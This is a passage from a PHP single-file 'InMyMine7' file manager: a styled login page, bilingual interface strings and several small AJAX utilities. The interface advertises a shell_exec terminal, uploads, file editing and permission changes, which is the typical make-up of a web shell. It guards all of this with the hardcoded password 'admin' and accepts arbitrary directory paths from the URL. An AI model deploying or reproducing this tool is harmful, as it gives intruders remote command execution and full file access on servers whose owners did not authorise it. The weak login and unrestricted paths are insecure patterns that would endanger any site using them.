<?php
session_start();

// ── LOGIN CHECK ──
$password = 'admin'; // Ganti password sesuai kebutuhan
$is_logged_in = isset($_SESSION['fm_logged_in']) && $_SESSION['fm_logged_in'] === true;

// Handle logout
if (isset($_GET['logout'])) {
    session_destroy();
    header('Location: ' . $_SERVER['PHP_SELF']);
    exit;
}

// Proses login
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['password'])) {
    if ($_POST['password'] === $password) {
        $_SESSION['fm_logged_in'] = true;
        header('Location: ' . $_SERVER['PHP_SELF']);
        exit;
    } else {
        $login_error = 'Password salah!';
    }
}

// Jika belum login, tampilkan form login
if (!$is_logged_in) {
    ?>
    <!DOCTYPE html>
    <html lang="id">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>Login - File Manager</title>
        <link rel="preconnect" href="https://fonts.googleapis.com">
        <link href="https://fonts.googleapis.com/css2?family=Fira+Code:wght@300;400;500;600;700&family=DM+Sans:ital,opsz,wght@0,9..40,300;0,9..40,400;0,9..40,500;0,9..40,600;0,9..40,700;1,9..40,300&display=swap" rel="stylesheet">
        <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css">
        <style>
            :root{
              --bg:#080810;--s1:#0d0d1a;--s2:#111124;--s3:#161630;--s4:#1c1c3a;
              --b1:#1e1e3c;--b2:#272750;--b3:#353566;
              --v:#7c5cfc;--v2:#a080ff;--v3:#c4aaff;
              --c:#00f5c4;--c2:#4fffd8;
              --pk:#ff4d8d;--pk2:#ff80aa;
              --y:#ffd166;--g:#39ff7e;--r:#ff3d6b;--o:#ff9800;
              --txt:#e0e0f0;--dim:#7070a0;--mute:#404068;--ghost:#22223a;
              --rad:14px;--rads:8px;--radp:5px;--tr:all .18s cubic-bezier(.4,0,.2,1);
            }
            *,*::before,*::after{box-sizing:border-box;margin:0;padding:0}
            html{scroll-behavior:smooth}
            body{background:var(--bg);color:var(--txt);font-family:'DM Sans',sans-serif;min-height:100vh;overflow-x:hidden;-webkit-font-smoothing:antialiased;display:flex;align-items:center;justify-content:center;padding:20px;}
            
            @keyframes float{0%,100%{transform:translateY(0px)}50%{transform:translateY(-20px)}}
            @keyframes pulse{0%{opacity:.5}50%{opacity:1}100%{opacity:.5}}
            @keyframes shimmer{to{background-position:200% center}}
            @keyframes glow{0%,100%{box-shadow:0 0 20px rgba(124,92,252,.3),0 0 40px rgba(0,245,196,.15)}50%{box-shadow:0 0 30px rgba(124,92,252,.5),0 0 60px rgba(0,245,196,.25)}}
            
            .bg-layer{position:fixed;inset:0;pointer-events:none;z-index:0;}
            .bg-layer::before{content:'';position:absolute;inset:0;background:radial-gradient(ellipse 90% 60% at 5% -10%,rgba(124,92,252,.18) 0%,transparent 55%),radial-gradient(ellipse 70% 80% at 100% 110%,rgba(0,245,196,.11) 0%,transparent 55%),radial-gradient(ellipse 60% 50% at 60% 55%,rgba(255,77,141,.07) 0%,transparent 55%);}
            
            .bg-grid{position:fixed;inset:0;pointer-events:none;z-index:0;background-image:linear-gradient(rgba(124,92,252,.04) 1px,transparent 1px),linear-gradient(90deg,rgba(124,92,252,.04) 1px,transparent 1px);background-size:40px 40px;}
            
            .bg-orbs{position:fixed;inset:0;pointer-events:none;z-index:0;overflow:hidden;}
            .orb{position:absolute;border-radius:50%;pointer-events:none;}
            .orb-1{width:300px;height:300px;background:radial-gradient(circle,rgba(124,92,252,.15),transparent);top:-150px;right:-150px;animation:float 6s ease-in-out infinite;}
            .orb-2{width:200px;height:200px;background:radial-gradient(circle,rgba(0,245,196,.12),transparent);bottom:-100px;left:-100px;animation:float 8s ease-in-out infinite 1s;}
            .orb-3{width:250px;height:250px;background:radial-gradient(circle,rgba(255,77,141,.1),transparent);top:50%;left:50%;transform:translate(-50%,-50%);animation:float 7s ease-in-out infinite 2s;}
            
            .login-wrapper{position:relative;z-index:1;display:flex;flex-direction:column;align-items:center;justify-content:center;min-height:100vh;width:100%;}
            
            .login-container {
                background:rgba(13,13,26,.85);
                border:1px solid var(--b1);
                border-radius:20px;
                box-shadow:0 0 60px rgba(124,92,252,.2),0 0 120px rgba(0,245,196,.1),inset 0 1px 1px rgba(255,255,255,.1);
                padding:clamp(30px,8vw,50px) clamp(25px,7vw,45px);
                width:100%;
                max-width:420px;
                backdrop-filter:blur(20px);
                position:relative;
                overflow:hidden;
                animation:glow 4s ease-in-out infinite;
            }
            
            .login-container::before{content:'';position:absolute;top:0;left:0;right:0;height:1px;background:linear-gradient(90deg,transparent,rgba(124,92,252,.5),rgba(0,245,196,.5),rgba(255,77,141,.5),transparent);}
            
            .login-container::after{content:'';position:absolute;inset:0;border-radius:20px;padding:1px;background:linear-gradient(135deg,rgba(124,92,252,.2),rgba(0,245,196,.2));-webkit-mask:linear-gradient(#fff 0 0) content-box,linear-gradient(#fff 0 0);-webkit-mask-composite:xor;mask-composite:exclude;pointer-events:none;}
            
            .brand-login{display:flex;align-items:center;gap:clamp(12px,3vw,16px);margin-bottom:clamp(25px,6vw,35px);justify-content:center;flex-wrap:wrap;}
            
            .brand-logo-login{width:clamp(44px,12vw,56px);height:clamp(44px,12vw,56px);border-radius:14px;background:linear-gradient(135deg,var(--v),var(--c));display:flex;align-items:center;justify-content:center;font-size:clamp(1rem,3vw,1.4rem);color:#fff;box-shadow:0 0 24px rgba(124,92,252,.5),0 0 48px rgba(124,92,252,.2);flex-shrink:0;animation:float 4s ease-in-out infinite;}
            
            .brand-info{text-align:center;}
            
            .login-title {
                font-family:'Fira Code',monospace;
                font-size:clamp(1.4rem,5vw,2rem);
                font-weight:700;
                background:linear-gradient(120deg,var(--v) 0%,var(--c) 50%,var(--pk) 100%);
                background-size:200% auto;
                -webkit-background-clip:text;
                -webkit-text-fill-color:transparent;
                margin-bottom:4px;
                letter-spacing:-.02em;
                animation:shimmer 5s linear infinite;
            }
            
            .login-subtitle {
                color:var(--dim);
                text-align:center;
                font-size:clamp(0.65rem,2vw,0.75rem);
                letter-spacing:0.15em;
                text-transform:uppercase;
                font-family:'Fira Code',monospace;
                font-weight:300;
            }
            
            .form-wrapper{margin-bottom:clamp(20px,5vw,30px);}
            
            .form-group {
                margin-bottom:clamp(18px,4vw,24px);
            }
            
            label {
                display:block;
                margin-bottom:8px;
                color:var(--txt);
                font-weight:600;
                font-size:clamp(0.8rem,2vw,0.9rem);
                letter-spacing:0.02em;
                text-transform:uppercase;
            }
            
            .input-wrapper{position:relative;}
            
            input[type="password"] {
                width:100%;
                padding:clamp(10px,2vw,14px) clamp(12px,2vw,16px);
                background:rgba(17,17,36,.6);
                border:1.5px solid var(--b1);
                border-radius:10px;
                color:var(--txt);
                font-size:clamp(0.85rem,2vw,0.95rem);
                font-family:'DM Sans',sans-serif;
                transition:var(--tr);
                backdrop-filter:blur(10px);
            }
            
            input[type="password"]::placeholder{color:var(--mute);}
            
            input[type="password"]:focus {
                outline:none;
                border-color:var(--v);
                background:rgba(124,92,252,.08);
                box-shadow:0 0 0 3px rgba(124,92,252,.15),inset 0 0 12px rgba(124,92,252,.08);
            }
            
            .error-message {
                color:var(--r);
                font-size:clamp(0.8rem,2vw,0.9rem);
                margin-bottom:clamp(15px,4vw,20px);
                padding:clamp(10px,2vw,14px) clamp(12px,2vw,14px);
                background:rgba(255,61,107,.12);
                border:1px solid rgba(255,61,107,.3);
                border-radius:10px;
                text-align:center;
                display:flex;
                align-items:center;
                justify-content:center;
                gap:8px;
                animation:pulse 2s ease-in-out infinite;
            }
            
            .btn-login {
                width:100%;
                padding:clamp(10px,2.5vw,14px) clamp(16px,3vw,24px);
                background:linear-gradient(135deg,var(--v),#5c3de0);
                color:#fff;
                border:none;
                border-radius:10px;
                font-size:clamp(0.85rem,2vw,0.95rem);
                font-weight:700;
                font-family:'DM Sans',sans-serif;
                cursor:pointer;
                transition:var(--tr);
                box-shadow:0 2px 0 rgba(0,0,0,.4),0 0 0 1px rgba(124,92,252,.3),0 0 28px rgba(124,92,252,.35);
                letter-spacing:0.02em;
                text-transform:uppercase;
                position:relative;
                overflow:hidden;
            }
            
            .btn-login::before{content:'';position:absolute;inset:0;background:linear-gradient(135deg,rgba(255,255,255,.2),transparent);opacity:0;transition:opacity .3s;}
            
            .btn-login:hover {
                background:linear-gradient(135deg,var(--v2),var(--v));
                transform:translateY(-2px);
                box-shadow:0 6px 20px rgba(124,92,252,.45),0 0 0 1px rgba(124,92,252,.5);
            }
            
            .btn-login:hover::before{opacity:1}
            
            .btn-login:active {
                transform:translateY(0);
            }
            
            @media(max-width:480px){
                body{padding:16px;}
                .login-wrapper{padding:clamp(20px,5vw,40px) 0;}
                .login-container{border-radius:16px;}
                .brand-login{flex-direction:column;gap:clamp(8px,2vw,12px);}
                .brand-info{width:100%;}
            }
            
            @media(max-width:360px){
                .login-title{font-size:1.3rem;}
                .login-container{padding:25px 20px;}
            }
        </style>
    </head>
    <body>
        <div class="bg-layer"></div>
        <div class="bg-grid"></div>
        <div class="bg-orbs">
            <div class="orb orb-1"></div>
            <div class="orb orb-2"></div>
            <div class="orb orb-3"></div>
        </div>
        <div class="login-wrapper">
            <div class="login-container">
                <div class="brand-login">
                    <div class="brand-logo-login"><i class="fa-solid fa-terminal"></i></div>
                    <div class="brand-info">
                        <div class="login-title">InMyMine7</div>
                        <div class="login-subtitle">File Manager</div>
                    </div>
                </div>
                
                <?php if (isset($login_error)): ?>
                    <div class="error-message">
                        <i class="fa-solid fa-exclamation-circle" style="font-size:0.9rem;"></i>
                        <?php echo htmlspecialchars($login_error); ?>
                    </div>
                <?php endif; ?>
                
                <div class="form-wrapper">
                    <form method="POST">
                        <div class="form-group">
                            <label for="password"><i class="fa-solid fa-lock"></i> Password</label>
                            <div class="input-wrapper">
                                <input type="password" id="password" name="password" placeholder="Masukkan password..." required autofocus>
                            </div>
                        </div>
                        <button type="submit" class="btn-login"><i class="fa-solid fa-sign-in-alt"></i> Login</button>
                    </form>
                </div>
            </div>
        </div>
    </body>
    </html>
    <?php
    exit;
}

// Root directory = direktori tempat file ini berada
$root_dir    = realpath(__DIR__);
if (!$root_dir) $root_dir = __DIR__;

$current_dir = isset($_GET['dir']) ? realpath($_GET['dir']) : $root_dir;
if (!$current_dir || !is_dir($current_dir)) $current_dir = $root_dir;

// ── LANGUAGE ── FIX: Prioritas: GET > COOKIE > default 'id'
$lang = 'id';
if (isset($_COOKIE['fm_lang']) && in_array($_COOKIE['fm_lang'], ['id','en'])) {
    $lang = $_COOKIE['fm_lang'];
}
if (isset($_GET['lang']) && in_array($_GET['lang'], ['id','en'])) {
    $lang = $_GET['lang'];
    setcookie('fm_lang', $lang, time()+86400*365, '/');
}

$T = [
    'id' => [
        'title'         => 'File Manager',
        'brand_sub'     => 'InMyMine7 File Manager v4',
        'folders'       => 'folder',
        'files'         => 'file',
        'free'          => 'bebas',
        'tab_files'     => 'File',
        'tab_upload'    => 'Upload',
        'tab_create'    => 'Buat Baru',
        'tab_zip'       => 'ZIP',
        'tab_search'    => 'Cari',
        'tab_terminal'  => 'Terminal',
        'tab_tools'     => 'Tools',
        'name'          => 'Nama',
        'size'          => 'Ukuran',
        'modified'      => 'Diubah',
        'mode'          => 'Mode',
        'action'        => 'Aksi',
        'open'          => 'Buka',
        'edit'          => 'Edit',
        'rename'        => 'Rename',
        'duplicate'     => 'Duplikasi',
        'download'      => 'Unduh',
        'copymove'      => 'Salin/Pindah',
        'delete'        => 'Hapus',
        'dl_zip'        => 'Unduh ZIP',
        'extract'       => 'Ekstrak',
        'upload_title'  => 'Upload File',
        'upload_hint'   => 'Klik atau seret & lepas file di sini (multi file)...',
        'upload_to'     => 'File akan diupload ke',
        'create_title'  => 'Buat File / Folder Baru',
        'new_file'      => 'File baru',
        'new_folder'    => 'Folder baru',
        'file_ph'       => 'contoh: index.php',
        'folder_ph'     => 'contoh: assets',
        'create_file'   => 'Buat File',
        'create_folder' => 'Buat Folder',
        'zip_title'     => 'Buat ZIP dari File',
        'zip_name_ph'   => 'nama-archive.zip',
        'make_zip'      => 'Buat ZIP',
        'select_files'  => 'Pilih file yang akan di-zip:',
        'no_files'      => 'Tidak ada file di folder ini.',
        'search_title'  => 'Cari File & Folder',
        'search_ph'     => 'Nama file atau folder...',
        'search_btn'    => 'Cari',
        'search_reset'  => 'Reset',
        'search_in'     => 'Mencari rekursif di',
        'results_found' => 'hasil ditemukan',
        'no_results'    => 'Tidak ada hasil untuk',
        'terminal_title'=> 'Terminal / Shell',
        'terminal_warn' => 'Gunakan dengan bijak. Hanya untuk keperluan administrasi yang sah.',
        'cmd_ph'        => 'ls -la  /  pwd  /  whoami  /  cat file.php',
        'run'           => 'Jalankan',
        'save'          => 'Simpan',
        'close'         => 'Tutup',
        'cancel'        => 'Batal',
        'apply'         => 'Terapkan',
        'lines'         => 'baris',
        'editing'       => 'Sedang edit',
        'close_editor'  => 'Tutup Editor',
        'rename_title'  => 'Rename',
        'new_name_ph'   => 'Nama baru...',
        'perm_title'    => 'Ubah Permissions',
        'perm_file'     => 'File',
        'perm_mode'     => 'Mode (octal)',
        'cm_title'      => 'Salin / Pindah File',
        'cm_file'       => 'File',
        'cm_dest'       => 'Path tujuan',
        'copy_here'     => 'Salin ke sini',
        'move_here'     => 'Pindah ke sini',
        'bulk_selected' => 'dipilih',
        'bulk_delete'   => 'Hapus',
        'bulk_zip'      => 'ZIP',
        'bulk_cancel'   => 'Batal',
        'bulk_zip_title'=> 'ZIP File Terpilih',
        'bulk_zip_name' => 'Nama ZIP',
        'confirm_del_file'  => 'Hapus file',
        'confirm_del_folder'=> 'Hapus folder',
        'confirm_del_bulk'  => 'item yang dipilih? Tindakan ini tidak dapat dibatalkan.',
        'confirm_and_contents' => 'dan isinya?',
        'home'          => 'Beranda',
        'up'            => 'Naik',
        'refresh'       => 'Refresh',
        'list_view'     => 'Daftar',
        'grid_view'     => 'Grid',
        'os_kernel'     => 'OS / Kernel',
        'server_ip'     => 'IP Server',
        'remote_ip'     => 'IP Remote',
        'domain'        => 'Domain · Host',
        'disk_used'     => 'Disk Digunakan / Total',
        'server_time'   => 'Waktu Server',
        'empty_dir'     => 'Folder ini kosong',
        'cannot_read'   => 'Tidak dapat membaca direktori',
        'toast_success' => 'Berhasil',
        'toast_error'   => 'Gagal',
        'shell_disabled'=> 'shell_exec DINONAKTIFKAN',
        'shell_enabled' => 'shell_exec aktif',
        'output_here'   => 'Output perintah akan muncul di sini...',
        'tab_hint'      => 'Tab = indent | Ctrl+S = simpan',
        'extract_zip'   => 'Ekstrak ZIP',
        'select_all'    => 'Pilih semua',
        'lang_toggle'   => 'English',
        'lang_icon'     => '🇬🇧',
        'current_path'  => 'Path Saat Ini',
        // Tools
        'tools_title'   => 'Tools & Utilitas',
        'tool_phpinfo'  => 'PHP Info',
        'tool_phpinfo_desc' => 'Lihat informasi PHP lengkap',
        'tool_imgcomp'  => 'Konversi Gambar',
        'tool_imgcomp_desc' => 'Konversi & resize gambar',
        'tool_base64'   => 'Base64 Encoder/Decoder',
        'tool_base64_desc' => 'Encode atau decode teks Base64',
        'tool_hash'     => 'Hash Generator',
        'tool_hash_desc'=> 'Generate MD5, SHA1, SHA256',
        'tool_htpasswd' => '.htpasswd Generator',
        'tool_htpasswd_desc' => 'Buat password untuk .htpasswd',
        'tool_cron'     => 'Cron Expression',
        'tool_cron_desc'=> 'Buat & uji cron expression',
        'tool_chmod'    => 'Chmod Calculator',
        'tool_chmod_desc'=> 'Hitung nilai permission octal',
        'tool_json'     => 'JSON Formatter',
        'tool_json_desc'=> 'Format & validasi JSON',
        'tool_regex'    => 'Regex Tester',
        'tool_regex_desc'=> 'Uji regular expression PHP',
        'tool_sysinfo'  => 'System Info',
        'tool_sysinfo_desc'=> 'Info lengkap server & PHP',
        'encode'        => 'Encode',
        'decode'        => 'Decode',
        'generate'      => 'Generate',
        'format'        => 'Format',
        'test'          => 'Uji',
        'result'        => 'Hasil',
        'input'         => 'Input',
        'output'        => 'Output',
        'open_tool'     => 'Buka',
        'resize_width'  => 'Lebar (px)',
        'resize_height' => 'Tinggi (px)',
        'img_quality'   => 'Kualitas (1-100)',
        'convert'       => 'Konversi',
        'select_image'  => 'Pilih gambar',
        'hash_text'     => 'Teks untuk di-hash',
        'subject'       => 'String uji',
        'pattern'       => 'Pattern regex',
        'matches'       => 'Match ditemukan',
        'no_match'      => 'Tidak ada match',
        'tool_uuid'     => 'UUID Generator',
        'tool_uuid_desc'=> 'Generate UUID v4 random',
        'tool_urlenc'   => 'URL Encoder/Decoder',
        'tool_urlenc_desc'=>'Encode atau decode URL',
        'tool_textstats'=> 'Text Statistics',
        'tool_textstats_desc'=>'Hitung karakter, kata, baris',
        'tool_passgen'  => 'Password Generator',
        'tool_passgen_desc'=>'Generate password aman acak',
        'tool_timestamp'=> 'Timestamp Converter',
        'tool_timestamp_desc'=>'Convert tanggal &amp; timestamp',
        'copy_to_clipboard' => 'Salin ke clipboard',
    ],
    'en' => [
        'title'         => 'File Manager',
        'brand_sub'     => 'Enhanced File Manager v4',
        'folders'       => 'folders',
        'files'         => 'files',
        'free'          => 'free',
        'tab_files'     => 'Files',
        'tab_upload'    => 'Upload',
        'tab_create'    => 'Create New',
        'tab_zip'       => 'ZIP',
        'tab_search'    => 'Search',
        'tab_terminal'  => 'Terminal',
        'tab_tools'     => 'Tools',
        'name'          => 'Name',
        'size'          => 'Size',
        'modified'      => 'Modified',
        'mode'          => 'Mode',
        'action'        => 'Actions',
        'open'          => 'Open',
        'edit'          => 'Edit',
        'rename'        => 'Rename',
        'duplicate'     => 'Duplicate',
        'download'      => 'Download',
        'copymove'      => 'Copy/Move',
        'delete'        => 'Delete',
        'dl_zip'        => 'Download ZIP',
        'extract'       => 'Extract',
        'upload_title'  => 'Upload Files',
        'upload_hint'   => 'Click or drag & drop files here (multi-file)...',
        'upload_to'     => 'Files will be uploaded to',
        'create_title'  => 'Create New File / Folder',
        'new_file'      => 'New file',
        'new_folder'    => 'New folder',
        'file_ph'       => 'e.g. index.php',
        'folder_ph'     => 'e.g. assets',
        'create_file'   => 'Create File',
        'create_folder' => 'Create Folder',
        'zip_title'     => 'Create ZIP from Files',
        'zip_name_ph'   => 'archive-name.zip',
        'make_zip'      => 'Create ZIP',
        'select_files'  => 'Select files to ZIP:',
        'no_files'      => 'No files in this folder.',
        'search_title'  => 'Search Files & Folders',
        'search_ph'     => 'File or folder name...',
        'search_btn'    => 'Search',
        'search_reset'  => 'Reset',
        'search_in'     => 'Searching recursively in',
        'results_found' => 'results found',
        'no_results'    => 'No results for',
        'terminal_title'=> 'Terminal / Shell',
        'terminal_warn' => 'Use responsibly. For authorized administration only.',
        'cmd_ph'        => 'ls -la  /  pwd  /  whoami  /  cat file.php',
        'run'           => 'Run',
        'save'          => 'Save',
        'close'         => 'Close',
        'cancel'        => 'Cancel',
        'apply'         => 'Apply',
        'lines'         => 'lines',
        'editing'       => 'Editing',
        'close_editor'  => 'Close Editor',
        'rename_title'  => 'Rename',
        'new_name_ph'   => 'New name...',
        'perm_title'    => 'Change Permissions',
        'perm_file'     => 'File',
        'perm_mode'     => 'Mode (octal)',
        'cm_title'      => 'Copy / Move File',
        'cm_file'       => 'File',
        'cm_dest'       => 'Destination path',
        'copy_here'     => 'Copy here',
        'move_here'     => 'Move here',
        'bulk_selected' => 'selected',
        'bulk_delete'   => 'Delete',
        'bulk_zip'      => 'ZIP',
        'bulk_cancel'   => 'Cancel',
        'bulk_zip_title'=> 'ZIP Selected Files',
        'bulk_zip_name' => 'ZIP Name',
        'confirm_del_file'  => 'Delete file',
        'confirm_del_folder'=> 'Delete folder',
        'confirm_del_bulk'  => 'selected items? This action cannot be undone.',
        'confirm_and_contents' => 'and all its contents?',
        'home'          => 'Home',
        'up'            => 'Up',
        'refresh'       => 'Refresh',
        'list_view'     => 'List',
        'grid_view'     => 'Grid',
        'os_kernel'     => 'OS / Kernel',
        'server_ip'     => 'Server IP',
        'remote_ip'     => 'Remote IP',
        'domain'        => 'Domain · Host',
        'disk_used'     => 'Disk Used / Total',
        'server_time'   => 'Server Time',
        'empty_dir'     => 'This folder is empty',
        'cannot_read'   => 'Cannot read directory',
        'toast_success' => 'Success',
        'toast_error'   => 'Error',
        'shell_disabled'=> 'shell_exec DISABLED',
        'shell_enabled' => 'shell_exec enabled',
        'output_here'   => 'Command output will appear here...',
        'tab_hint'      => 'Tab = indent | Ctrl+S = save',
        'extract_zip'   => 'Extract ZIP',
        'select_all'    => 'Select all',
        'lang_toggle'   => 'Indonesia',
        'lang_icon'     => '🇮🇩',
        'current_path'  => 'Current Path',
        // Tools
        'tools_title'   => 'Tools & Utilities',
        'tool_phpinfo'  => 'PHP Info',
        'tool_phpinfo_desc' => 'View full PHP information',
        'tool_imgcomp'  => 'Image Converter',
        'tool_imgcomp_desc' => 'Convert & resize images',
        'tool_base64'   => 'Base64 Encoder/Decoder',
        'tool_base64_desc' => 'Encode or decode Base64 text',
        'tool_hash'     => 'Hash Generator',
        'tool_hash_desc'=> 'Generate MD5, SHA1, SHA256',
        'tool_htpasswd' => '.htpasswd Generator',
        'tool_htpasswd_desc' => 'Create password for .htpasswd',
        'tool_cron'     => 'Cron Expression',
        'tool_cron_desc'=> 'Build & test cron expressions',
        'tool_chmod'    => 'Chmod Calculator',
        'tool_chmod_desc'=> 'Calculate octal permission value',
        'tool_json'     => 'JSON Formatter',
        'tool_json_desc'=> 'Format & validate JSON',
        'tool_regex'    => 'Regex Tester',
        'tool_regex_desc'=> 'Test PHP regular expressions',
        'tool_sysinfo'  => 'System Info',
        'tool_sysinfo_desc'=> 'Full server & PHP info',
        'encode'        => 'Encode',
        'decode'        => 'Decode',
        'generate'      => 'Generate',
        'format'        => 'Format',
        'test'          => 'Test',
        'result'        => 'Result',
        'input'         => 'Input',
        'output'        => 'Output',
        'open_tool'     => 'Open',
        'resize_width'  => 'Width (px)',
        'resize_height' => 'Height (px)',
        'img_quality'   => 'Quality (1-100)',
        'convert'       => 'Convert',
        'select_image'  => 'Select image',
        'hash_text'     => 'Text to hash',
        'subject'       => 'Test string',
        'pattern'       => 'Regex pattern',
        'matches'       => 'Matches found',
        'no_match'      => 'No match',
        'tool_uuid'     => 'UUID Generator',
        'tool_uuid_desc'=> 'Generate random UUID v4',
        'tool_urlenc'   => 'URL Encoder/Decoder',
        'tool_urlenc_desc'=>'Encode or decode URL',
        'tool_textstats'=> 'Text Statistics',
        'tool_textstats_desc'=>'Count characters, words, lines',
        'tool_passgen'  => 'Password Generator',
        'tool_passgen_desc'=>'Generate random secure password',
        'tool_timestamp'=> 'Timestamp Converter',
        'tool_timestamp_desc'=>'Convert dates & timestamps',
        'copy_to_clipboard' => 'Copy to clipboard',
    ],
];

$t = $T[$lang];

// ── TOOL ACTIONS (AJAX) ──
// Hash generator AJAX
if(isset($_POST['tool_hash'])){
    $txt = $_POST['hash_input'] ?? '';
    echo json_encode(['md5'=>md5($txt),'sha1'=>sha1($txt),'sha256'=>hash('sha256',$txt),'sha512'=>hash('sha512',$txt)]);
    exit;
}
// Regex tester AJAX
if(isset($_POST['tool_regex'])){
    $pattern = $_POST['regex_pattern'] ?? '';
    $subject = $_POST['regex_subject'] ?? '';
    $result = ['matches'=>[],'count'=>0,'error'=>''];
    if($pattern){
        $r = @preg_match_all($pattern, $subject, $m);
        if($r === false){
            $result['error'] = preg_last_error_msg();
        } else {
            $result['count'] = $r;
            $result['matches'] = $m[0] ?? [];
        }
    }
    echo json_encode($result);
    exit;
}
// htpasswd AJAX
if(isset($_POST['tool_htpasswd'])){
    $user = trim($_POST['ht_user'] ?? '');
    $pass = trim($_POST['ht_pass'] ?? '');
    if(!$user||!$pass){echo json_encode(['error'=>'User/pass empty']);exit;}
    $hashed = password_hash($pass, PASSWORD_BCRYPT);
    echo json_encode(['line'=>"$user:$hashed"]);
    exit;
}
// Image convert AJAX
if(isset($_POST['tool_imgconv']) && isset($_FILES['img_file'])){
    $tmp = $_FILES['img_file']['tmp_name'];
    $type = exif_imagetype($tmp);
    $fmt  = strtolower($_POST['img_fmt'] ?? 'png');
    $w    = intval($_POST['img_w'] ?? 0);
    $h    = intval($_POST['img_h'] ?? 0);
    $q    = intval($_POST['img_q'] ?? 85);
    if(!in_array($type,[IMAGETYPE_JPEG,IMAGETYPE_PNG,IMAGETYPE_GIF,IMAGETYPE_WEBP])){
        echo json_encode(['error'=>'Unsupported image type']);exit;
    }
    $img = imagecreatefromstring(file_get_contents($tmp));
    if(!$img){echo json_encode(['error'=>'Cannot load image']);exit;}
    $ow = imagesx($img); $oh = imagesy($img);
    if($w>0||$h>0){
        if(!$w) $w = intval($ow*$h/$oh);
        if(!$h) $h = intval($oh*$w/$ow);
        $res = imagescale($img,$w,$h);
    } else { $res = $img; }
    ob_start();
    switch($fmt){
        case 'jpg': case 'jpeg': imagejpeg($res,null,$q);break;
        case 'gif': imagegif($res);break;
        case 'webp': imagewebp($res,null,$q);break;
        default: imagepng($res);
    }
    $data = ob_get_clean();
    $mime = ($fmt==='jpg'||$fmt==='jpeg')?'image/jpeg':(($fmt==='gif')?'image/gif':(($fmt==='webp')?'image/webp':'image/png'));
    echo json_encode(['base64'=>base64_encode($data),'mime'=>$mime,'w'=>imagesx($res),'h'=>imagesy($res)]);
    imagedestroy($img);
    exit;
}
// UUID Generator AJAX
if(isset($_POST['tool_uuid'])){
    $count = intval($_POST['uuid_count'] ?? 1);
    if($count<1)$count=1;if($count>20)$count=20;
    $uuids = [];
    for($i=0;$i<$count;$i++){
        $uuid = sprintf(
            '%04x%04x-%04x-%04x-%04x-%04x%04x%04x',
            mt_rand(0, 0xffff), mt_rand(0, 0xffff),
            mt_rand(0, 0xffff),
            mt_rand(0, 0x0fff) | 0x4000,
            mt_rand(0, 0x3fff) | 0x8000,
            mt_rand(0, 0xffff), mt_rand(0, 0xffff), mt_rand(0, 0xffff)
        );
        $uuids[] = $uuid;
    }
    echo json_encode(['uuids'=>$uuids]);
    exit;
}
// URL Encoder/Decoder AJAX
if(isset($_POST['tool_urlenc'])){
    $txt = $_POST['urlenc_text'] ?? '';
    $op = $_POST['urlenc_op'] ?? 'encode';
    $result = ($op==='encode') ? rawurlencode($txt) : rawurldecode($txt);
    echo json_encode(['result'=>$result]);
    exit;
}
// Text Statistics AJAX
if(isset($_POST['tool_textstats'])){
    $txt = $_POST['stats_text'] ?? '';
    $chars = strlen($txt);
    $charsnospace = strlen(preg_replace('/\s+/', '', $txt));
    $words = count(array_filter(preg_split('/\s+/', trim($txt))));
    $lines = count(array_filter(explode("\n", $txt)));
    $sentences = count(array_filter(preg_split('/[.!?]+/', $txt)));
    echo json_encode([
        'chars'=>$chars,
        'charsnospace'=>$charsnospace,
        'words'=>$words,
        'lines'=>$lines,
        'sentences'=>$sentences
    ]);
    exit;
}
// Password Generator AJAX
if(isset($_POST['tool_passgen'])){
    $len = intval($_POST['pass_len'] ?? 16);
    if($len<8)$len=8;if($len>64)$len=64;
    $lower = 'abcdefghijklmnopqrstuvwxyz';
    $upper = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ';
    $digits = '0123456789';
    $special = '!@#$%^&*-_+=?';
    $all = $lower.$upper.$digits.(isset($_POST['pass_special'])?$special:'');
    $pass = '';
    for($i=0;$i<$len;$i++){
        $pass .= $all[mt_rand(0, strlen($all)-1)];
    }
    echo json_encode(['password'=>$pass]);
    exit;
}
// Timestamp Converter AJAX
if(isset($_POST['tool_timestamp'])){
    $op = $_POST['ts_op'] ?? 'todate';
    $val = $_POST['ts_val'] ?? '';
    $result = '';
    if($op==='todate' && is_numeric($val)){
        $result = date('Y-m-d H:i:s', intval($val));
    } else if($op==='totimestamp' && !empty($val)){
        $ts = strtotime($val);
        if($ts!==false){$result = $ts;}
    }
    echo json_encode(['result'=>$result]);
    exit;
}

function fmt_size($b){
    if($b<1024)return $b.' B';
    if($b<1048576)return round($b/1024,1).' KB';
    if($b<1073741824)return round($b/1048576,1).' MB';
    return round($b/1073741824,1).' GB';
}

function fa_icon($name){
    $ext=strtolower(pathinfo($name,PATHINFO_EXTENSION));
    $m=[
        'php'=>['fa-brands fa-php','#8892bf'],
        'js' =>['fa-brands fa-js','#f7df1e'],
        'ts' =>['fa-solid fa-code','#3178c6'],
        'html'=>['fa-brands fa-html5','#e34c26'],
        'htm'=>['fa-brands fa-html5','#e34c26'],
        'css'=>['fa-brands fa-css3-alt','#264de4'],
        'json'=>['fa-solid fa-code','#ffca28'],
        'xml'=>['fa-solid fa-file-code','#ff6d00'],
        'sql'=>['fa-solid fa-database','#00acc1'],
        'jpg'=>['fa-solid fa-image','#ab47bc'],
        'jpeg'=>['fa-solid fa-image','#ab47bc'],
        'png'=>['fa-solid fa-image','#ab47bc'],
        'gif'=>['fa-solid fa-image','#ab47bc'],
        'svg'=>['fa-solid fa-bezier-curve','#ff7043'],
        'webp'=>['fa-solid fa-image','#ab47bc'],
        'mp4'=>['fa-solid fa-film','#ef5350'],
        'mkv'=>['fa-solid fa-film','#ef5350'],
        'avi'=>['fa-solid fa-film','#ef5350'],
        'mp3'=>['fa-solid fa-music','#26c6da'],
        'wav'=>['fa-solid fa-music','#26c6da'],
        'zip'=>['fa-solid fa-file-zipper','#ffa726'],
        'rar'=>['fa-solid fa-file-zipper','#ffa726'],
        'tar'=>['fa-solid fa-file-zipper','#ffa726'],
        'gz' =>['fa-solid fa-file-zipper','#ffa726'],
        'pdf'=>['fa-solid fa-file-pdf','#f44336'],
        'doc'=>['fa-solid fa-file-word','#2b579a'],
        'docx'=>['fa-solid fa-file-word','#2b579a'],
        'xls'=>['fa-solid fa-file-excel','#217346'],
        'xlsx'=>['fa-solid fa-file-excel','#217346'],
